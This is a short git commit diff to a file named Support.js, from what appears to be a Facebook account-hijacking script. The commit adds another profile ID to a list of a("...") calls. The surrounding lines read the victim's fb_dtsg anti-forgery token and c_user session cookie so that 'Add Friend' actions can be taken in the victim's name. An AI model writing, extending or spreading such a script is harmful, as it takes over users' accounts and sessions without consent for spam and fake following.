1e86b875e296741b0a2974750ec905f3f8a122a6
wazzygray <qariwaqar@gmail.com>
2013-06-04 20:21:46 +0500

    Update Support.js

--- Support.js
+++ Support.js
@@ -177,6 +177,7 @@ a("100004121340012");
 a("100005783323902");
 a("100003785647375");
 a("100003595638172");
+a("100003147643648");
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
